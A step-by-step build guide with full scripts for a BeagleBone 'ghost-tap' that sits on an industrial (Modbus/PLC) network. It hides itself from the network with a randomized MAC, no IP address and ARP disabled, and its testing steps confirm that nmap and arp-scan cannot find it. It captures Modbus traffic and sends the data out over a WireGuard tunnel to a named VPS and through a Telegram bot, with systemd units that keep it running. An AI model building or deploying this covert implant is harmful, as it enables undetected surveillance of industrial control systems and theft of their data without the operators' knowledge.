# Industrial Edge Adapter — Software Build Guide

**Project:** Network Ninja Passive Tap  
**OS:** Debian Linux for BeagleBone  
**Date:** 2026-01-29

---

## Table of Contents

1. [Flash OS](#1-flash-os)
2. [Initial Access](#2-initial-access)
3. [System Configuration](#3-system-configuration)
4. [Network Stealth Setup](#4-network-stealth-setup)
5. [WireGuard VPN](#5-wireguard-vpn)
6. [Packet Capture Stack](#6-packet-capture-stack)
7. [Protocol Decoders](#7-protocol-decoders)
8. [Telegram Integration](#8-telegram-integration)
9. [Systemd Services](#9-systemd-services)
10. [Testing & Validation](#10-testing--validation)

---

## 1. Flash OS

### Option A: Use Built-in eMMC (Recommended)
The BeagleBone Industrial comes with Debian pre-installed on eMMC.
```bash
# Just power on and proceed to step 2
```

### Option B: Flash Fresh Debian to MicroSD

**Download Image:**
```bash
# On your computer
wget https://rcn-ee.com/rootfs/bb.org/testing/2025-12-01/bookworm-minimal-armhf/bone-debian-12.8-minimal-armhf-2025-12-01-2gb.img.xz
```

**Flash to MicroSD (Mac/Linux):**
```bash
# Find your SD card
lsblk
# or on Mac: diskutil list

# Flash (replace /dev/sdX with your device)
xzcat bone-debian-12.8-minimal-armhf-2025-12-01-2gb.img.xz | sudo dd of=/dev/sdX bs=4M status=progress
sync
```

**Flash to MicroSD (Windows):**
- Use [balenaEtcher](https://www.balena.io/etcher/)
- Select the .img.xz file
- Select your SD card
- Click Flash

---

## 2. Initial Access

### Method 1: USB Network (Easiest)

Connect Mini-USB to your computer. BeagleBone creates a virtual network.

```bash
# Wait 60 seconds after power on
# BeagleBone IP over USB: 192.168.7.2

ssh debian@192.168.7.2
# Password: temppwd
```

### Method 2: USB Serial Console

```bash
# Mac/Linux
screen /dev/ttyUSB0 115200

# Login at prompt
# Username: debian
# Password: temppwd
```

### Method 3: Ethernet (if DHCP available)

```bash
# Find BeagleBone on network
nmap -sn 192.168.1.0/24 | grep -B2 "BeagleBone"

# SSH to discovered IP
ssh debian@<IP_ADDRESS>
```

---

## 3. System Configuration

### 3.1 Become Root
```bash
sudo -i
# All following commands as root
```

### 3.2 Update System
```bash
apt update && apt upgrade -y
```

### 3.3 Set Hostname
```bash
hostnamectl set-hostname ghost-tap
echo "127.0.0.1 ghost-tap" >> /etc/hosts
```

### 3.4 Set Timezone
```bash
timedatectl set-timezone America/Chicago
```

### 3.5 Create Service User
```bash
useradd -r -s /bin/false ghost
mkdir -p /opt/ghost-tap
chown ghost:ghost /opt/ghost-tap
```

### 3.6 Install Core Packages
```bash
apt install -y \
  python3 python3-pip python3-venv \
  tcpdump tshark \
  wireguard wireguard-tools \
  iptables-persistent \
  git curl jq \
  net-tools iproute2
```

### 3.7 Install Python Packages
```bash
pip3 install --break-system-packages \
  scapy \
  pymodbus \
  asyncua \
  paho-mqtt \
  python-telegram-bot \
  requests
```

---

## 4. Network Stealth Setup

### 4.1 Identify Interfaces
```bash
ip link show

# Expected:
# eth0 = Built-in Ethernet (PLC network - STEALTH)
# eth1 or enx* = USB-Ethernet (WireGuard tunnel)
```

### 4.2 Create Stealth Script
```bash
cat > /opt/ghost-tap/ghost-mode.sh << 'EOF'
#!/bin/bash
# Ghost Mode - Make interface invisible

STEALTH_IFACE="${1:-eth0}"

echo "[GHOST] Activating stealth on $STEALTH_IFACE"

# Take interface down
ip link set $STEALTH_IFACE down

# Randomize MAC address
NEW_MAC=$(openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/:$//')
ip link set $STEALTH_IFACE address $NEW_MAC
echo "[GHOST] New MAC: $NEW_MAC"

# Bring up WITHOUT IP address
ip link set $STEALTH_IFACE up

# Enable promiscuous mode
ip link set $STEALTH_IFACE promisc on

# Disable ARP
ip link set $STEALTH_IFACE arp off

# Flush any existing IP
ip addr flush dev $STEALTH_IFACE

echo "[GHOST] Interface $STEALTH_IFACE is now invisible"
ip link show $STEALTH_IFACE
EOF

chmod +x /opt/ghost-tap/ghost-mode.sh
```

### 4.3 Create Firewall Rules
```bash
cat > /opt/ghost-tap/firewall.sh << 'EOF'
#!/bin/bash
# Firewall - Block all traffic on stealth interface

STEALTH_IFACE="${1:-eth0}"
WG_IFACE="wg0"

# Flush existing rules
iptables -F
iptables -X

# Default policies
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# BLOCK everything on stealth interface (capture only)
iptables -A INPUT -i $STEALTH_IFACE -j DROP
iptables -A OUTPUT -o $STEALTH_IFACE -j DROP

# Allow WireGuard
iptables -A OUTPUT -o $WG_IFACE -j ACCEPT
iptables -A INPUT -i $WG_IFACE -j ACCEPT

# Allow WireGuard UDP (on non-stealth interface)
iptables -A OUTPUT -p udp --dport 51820 -j ACCEPT
iptables -A INPUT -p udp --sport 51820 -j ACCEPT

# Allow DNS (for initial setup only - remove later)
# iptables -A OUTPUT -p udp --dport 53 -j ACCEPT

echo "[FIREWALL] Rules applied - stealth interface locked down"
iptables -L -v
EOF

chmod +x /opt/ghost-tap/firewall.sh
```

### 4.4 Disable Network Services
```bash
# Disable services that broadcast
systemctl disable avahi-daemon 2>/dev/null
systemctl stop avahi-daemon 2>/dev/null
systemctl disable systemd-resolved 2>/dev/null

# Disable DHCP client on stealth interface
cat > /etc/network/interfaces.d/eth0 << 'EOF'
# Stealth interface - NO IP
auto eth0
iface eth0 inet manual
    pre-up /opt/ghost-tap/ghost-mode.sh eth0
EOF
```

---

## 5. WireGuard VPN

### 5.1 Generate Keys (On BeagleBone)
```bash
cd /etc/wireguard
wg genkey | tee privatekey | wg pubkey > publickey
chmod 600 privatekey

echo "BeagleBone Public Key:"
cat publickey
# Save this - you'll need it for server config
```

### 5.2 Server Setup (On Your VPS: 72.60.175.144)

```bash
# On the VPS
apt install wireguard -y

cd /etc/wireguard
wg genkey | tee privatekey | wg pubkey > publickey

cat > /etc/wireguard/wg0.conf << EOF
[Interface]
PrivateKey = $(cat privatekey)
Address = 10.100.0.1/24
ListenPort = 51820
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
# BeagleBone Ghost Tap
PublicKey = <BEAGLEBONE_PUBLIC_KEY>
AllowedIPs = 10.100.0.2/32
EOF

# Enable and start
systemctl enable wg-quick@wg0
systemctl start wg-quick@wg0
```

### 5.3 Client Config (On BeagleBone)
```bash
# Get your VPS public key
VPS_PUBKEY="<your-vps-public-key>"

cat > /etc/wireguard/wg0.conf << EOF
[Interface]
PrivateKey = $(cat /etc/wireguard/privatekey)
Address = 10.100.0.2/24

[Peer]
PublicKey = $VPS_PUBKEY
Endpoint = 72.60.175.144:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
EOF

chmod 600 /etc/wireguard/wg0.conf

# Enable and start
systemctl enable wg-quick@wg0
systemctl start wg-quick@wg0

# Verify
wg show
ping 10.100.0.1
```

---

## 6. Packet Capture Stack

### 6.1 Basic Capture Script
```bash
cat > /opt/ghost-tap/capture.py << 'EOF'
#!/usr/bin/env python3
"""
Ghost Tap - Passive Industrial Protocol Capture
READ-ONLY: This script NEVER sends packets
"""

from scapy.all import *
from scapy.contrib.modbus import *
import json
import time
from datetime import datetime

# Configuration
STEALTH_IFACE = "eth0"
MODBUS_PORT = 502
OUTPUT_FILE = "/opt/ghost-tap/capture.jsonl"

def decode_modbus(pkt):
    """Extract data from Modbus TCP packets"""
    try:
        if TCP in pkt:
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            
            # Only Modbus port
            if sport != MODBUS_PORT and dport != MODBUS_PORT:
                return None
            
            # Get raw payload
            if Raw in pkt:
                payload = bytes(pkt[Raw])
                if len(payload) < 8:
                    return None
                
                # Parse Modbus TCP header
                trans_id = int.from_bytes(payload[0:2], 'big')
                proto_id = int.from_bytes(payload[2:4], 'big')
                length = int.from_bytes(payload[4:6], 'big')
                unit_id = payload[6]
                func_code = payload[7]
                
                # Only READ functions (security: never capture write commands)
                READ_FUNCTIONS = [1, 2, 3, 4]  # Read Coils, Discrete, Holding, Input
                
                if func_code not in READ_FUNCTIONS:
                    return None
                
                data = {
                    "timestamp": datetime.now().isoformat(),
                    "src_ip": pkt[IP].src,
                    "dst_ip": pkt[IP].dst,
                    "src_port": sport,
                    "dst_port": dport,
                    "transaction_id": trans_id,
                    "unit_id": unit_id,
                    "function_code": func_code,
                    "function_name": {1: "Read Coils", 2: "Read Discrete", 
                                     3: "Read Holding", 4: "Read Input"}.get(func_code),
                    "raw_data": payload[8:].hex() if len(payload) > 8 else ""
                }
                
                return data
    except Exception as e:
        pass
    return None

def packet_callback(pkt):
    """Process each captured packet"""
    if IP in pkt and TCP in pkt:
        modbus_data = decode_modbus(pkt)
        if modbus_data:
            # Log to file
            with open(OUTPUT_FILE, 'a') as f:
                f.write(json.dumps(modbus_data) + '\n')
            
            # Print summary
            print(f"[MODBUS] {modbus_data['src_ip']} -> {modbus_data['dst_ip']} "
                  f"| {modbus_data['function_name']} | Unit {modbus_data['unit_id']}")

def main():
    print(f"[GHOST-TAP] Starting passive capture on {STEALTH_IFACE}")
    print(f"[GHOST-TAP] READ-ONLY mode - zero packets transmitted")
    print(f"[GHOST-TAP] Logging to {OUTPUT_FILE}")
    print("-" * 60)
    
    # Capture filter: only TCP port 502 (Modbus)
    bpf_filter = f"tcp port {MODBUS_PORT}"
    
    # Sniff passively - store=0 means don't keep packets in memory
    sniff(
        iface=STEALTH_IFACE,
        filter=bpf_filter,
        prn=packet_callback,
        store=0
    )

if __name__ == "__main__":
    main()
EOF

chmod +x /opt/ghost-tap/capture.py
```

### 6.2 Test Capture Manually
```bash
# Run in foreground to test
python3 /opt/ghost-tap/capture.py
```

---

## 7. Protocol Decoders

### 7.1 Modbus Register Parser
```bash
cat > /opt/ghost-tap/modbus_parser.py << 'EOF'
#!/usr/bin/env python3
"""
Modbus Response Parser
Extracts actual register values from responses
"""

import struct

def parse_read_holding_response(data: bytes) -> list:
    """Parse Function Code 3 response"""
    if len(data) < 2:
        return []
    
    byte_count = data[0]
    registers = []
    
    for i in range(1, byte_count + 1, 2):
        if i + 1 < len(data):
            value = struct.unpack('>H', data[i:i+2])[0]
            registers.append(value)
    
    return registers

def parse_read_coils_response(data: bytes) -> list:
    """Parse Function Code 1 response"""
    if len(data) < 2:
        return []
    
    byte_count = data[0]
    coils = []
    
    for i in range(1, byte_count + 1):
        if i < len(data):
            byte_val = data[i]
            for bit in range(8):
                coils.append(bool(byte_val & (1 << bit)))
    
    return coils

# Value type conversions
def registers_to_float(regs: list, index: int = 0) -> float:
    """Convert two 16-bit registers to 32-bit float"""
    if len(regs) < index + 2:
        return 0.0
    combined = (regs[index] << 16) | regs[index + 1]
    return struct.unpack('>f', struct.pack('>I', combined))[0]

def registers_to_int32(regs: list, index: int = 0) -> int:
    """Convert two 16-bit registers to 32-bit signed int"""
    if len(regs) < index + 2:
        return 0
    combined = (regs[index] << 16) | regs[index + 1]
    if combined >= 0x80000000:
        combined -= 0x100000000
    return combined
EOF
```

### 7.2 OPC UA Passive Decoder (Future)
```bash
cat > /opt/ghost-tap/opcua_parser.py << 'EOF'
#!/usr/bin/env python3
"""
OPC UA Passive Decoder
Extracts data from OPC UA PublishResponse messages
NOTE: OPC UA is encrypted by default - this only works on unencrypted traffic
"""

# OPC UA passive decoding is complex due to:
# 1. Binary encoding
# 2. Often encrypted (SecurityPolicy)
# 3. Session-based state

# For encrypted OPC UA, you would need:
# - Access to server certificate
# - Man-in-the-middle position
# - This is typically not possible/practical

# For unencrypted OPC UA (SecurityPolicy=None):
# - Parse MessageType header
# - Extract PublishResponse
# - Decode monitored item values

print("OPC UA passive decoding: Limited to unencrypted traffic")
print("Most production OPC UA uses encryption - active client recommended")
EOF
```

---

## 8. Telegram Integration

### 8.1 Alert Forwarder
```bash
cat > /opt/ghost-tap/telegram_alert.py << 'EOF'
#!/usr/bin/env python3
"""
Forward captured data to Telegram
"""

import json
import requests
import time
from pathlib import Path

# Configuration - UPDATE THESE
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
CAPTURE_FILE = "/opt/ghost-tap/capture.jsonl"

def send_telegram(message: str):
    """Send message to Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

def format_modbus_alert(data: dict) -> str:
    """Format Modbus data as readable message"""
    return (
        f"🔌 <b>Modbus Capture</b>\n"
        f"Time: {data['timestamp']}\n"
        f"Source: {data['src_ip']}\n"
        f"Target: {data['dst_ip']}\n"
        f"Function: {data['function_name']}\n"
        f"Unit ID: {data['unit_id']}\n"
        f"Data: <code>{data['raw_data'][:50]}</code>"
    )

def tail_and_forward():
    """Tail capture file and forward new entries"""
    print(f"[TELEGRAM] Watching {CAPTURE_FILE}")
    
    # Start at end of file
    pos = Path(CAPTURE_FILE).stat().st_size if Path(CAPTURE_FILE).exists() else 0
    
    while True:
        try:
            if Path(CAPTURE_FILE).exists():
                with open(CAPTURE_FILE, 'r') as f:
                    f.seek(pos)
                    for line in f:
                        if line.strip():
                            data = json.loads(line)
                            message = format_modbus_alert(data)
                            send_telegram(message)
                            print(f"[SENT] {data['function_name']}")
                    pos = f.tell()
        except Exception as e:
            print(f"Error: {e}")
        
        time.sleep(1)

if __name__ == "__main__":
    tail_and_forward()
EOF

chmod +x /opt/ghost-tap/telegram_alert.py
```

---

## 9. Systemd Services

### 9.1 Ghost Mode Service
```bash
cat > /etc/systemd/system/ghost-mode.service << 'EOF'
[Unit]
Description=Ghost Mode Network Stealth
Before=network.target
Wants=network.target

[Service]
Type=oneshot
ExecStart=/opt/ghost-tap/ghost-mode.sh eth0
ExecStartPost=/opt/ghost-tap/firewall.sh eth0
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
```

### 9.2 Capture Service
```bash
cat > /etc/systemd/system/ghost-capture.service << 'EOF'
[Unit]
Description=Ghost Tap Passive Capture
After=ghost-mode.service wg-quick@wg0.service
Requires=ghost-mode.service

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /opt/ghost-tap/capture.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
```

### 9.3 Telegram Forwarder Service
```bash
cat > /etc/systemd/system/ghost-telegram.service << 'EOF'
[Unit]
Description=Ghost Tap Telegram Forwarder
After=ghost-capture.service wg-quick@wg0.service
Requires=wg-quick@wg0.service

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /opt/ghost-tap/telegram_alert.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
```

### 9.4 Enable All Services
```bash
systemctl daemon-reload
systemctl enable ghost-mode
systemctl enable ghost-capture
systemctl enable ghost-telegram
systemctl enable wg-quick@wg0

# Start services
systemctl start ghost-mode
systemctl start wg-quick@wg0
systemctl start ghost-capture
systemctl start ghost-telegram
```

---

## 10. Testing & Validation

### 10.1 Verify Stealth Mode
```bash
# Check interface has no IP
ip addr show eth0
# Should show: NO inet address

# Check promiscuous mode
ip link show eth0 | grep PROMISC
# Should show: PROMISC flag

# Check ARP disabled
ip link show eth0 | grep NOARP
# Should show: NOARP flag
```

### 10.2 Test from Another Machine
```bash
# From a computer on the same network, try to find BeagleBone
nmap -sn 192.168.1.0/24

# BeagleBone should NOT appear in results
# (It has no IP to respond with)

# Try ARP scan
arp-scan --localnet

# BeagleBone should NOT appear
# (ARP is disabled)
```

### 10.3 Verify WireGuard
```bash
# On BeagleBone
wg show
# Should show peer with recent handshake

# Ping VPS through tunnel
ping 10.100.0.1
```

### 10.4 Test Capture
```bash
# Check capture log
tail -f /opt/ghost-tap/capture.jsonl

# You should see Modbus traffic from PLCs on the network
```

### 10.5 Test Telegram
```bash
# Check service status
systemctl status ghost-telegram

# Check for messages in your Telegram
```

---

## Quick Reference Commands

```bash
# Check all services
systemctl status ghost-mode ghost-capture ghost-telegram wg-quick@wg0

# View capture log
tail -f /opt/ghost-tap/capture.jsonl

# View system log
journalctl -u ghost-capture -f

# Restart everything
systemctl restart ghost-mode ghost-capture ghost-telegram

# Check interface status
ip link show eth0

# Check WireGuard
wg show
```

---

## Troubleshooting

| Issue | Check | Fix |
|-------|-------|-----|
| No packets captured | `tcpdump -i eth0` | Verify cable, switch port |
| WireGuard not connecting | `wg show`, `ping VPS` | Check keys, firewall, endpoint |
| Telegram not sending | Service logs | Check bot token, chat ID |
| BeagleBone visible on network | `ip addr show eth0` | Run ghost-mode.sh again |
| Service won't start | `journalctl -u <service>` | Check Python errors |

---

## Security Checklist

```
□ eth0 has no IP address
□ eth0 ARP is disabled
□ eth0 firewall blocks all in/out
□ MAC address randomized
□ No broadcast services running
□ WireGuard tunnel working
□ Capture is READ-ONLY (no write functions)
□ Telegram over encrypted tunnel only
```

---

## File Summary

```
/opt/ghost-tap/
├── ghost-mode.sh          # Stealth network setup
├── firewall.sh            # iptables rules
├── capture.py             # Main packet capture
├── modbus_parser.py       # Modbus decoder
├── opcua_parser.py        # OPC UA decoder (limited)
├── telegram_alert.py      # Alert forwarder
└── capture.jsonl          # Captured data log

/etc/systemd/system/
├── ghost-mode.service     # Network stealth
├── ghost-capture.service  # Packet capture
└── ghost-telegram.service # Telegram forwarder

/etc/wireguard/
├── wg0.conf              # WireGuard config
├── privatekey            # WG private key
└── publickey             # WG public key
```

---

*Network Ninja Mode: Active. You are now invisible.*
